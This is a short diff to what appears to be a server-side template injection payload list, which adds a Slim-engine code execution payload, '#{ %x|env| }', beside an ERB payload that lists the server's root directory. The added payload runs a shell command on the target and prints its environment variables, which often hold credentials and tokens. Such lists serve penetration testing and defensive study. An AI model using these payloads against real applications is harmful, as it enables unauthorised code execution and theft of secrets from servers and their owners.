@@ -85,6 +85,14 @@ Slim:
 <%= Dir.entries('/') %>
 ```
 
+### Code execution
+
+Execute code using SSTI for Slim engine.
+
+```powershell
+#{ %x|env| }
+```
+
 ## Java
 
 ### Basic injection
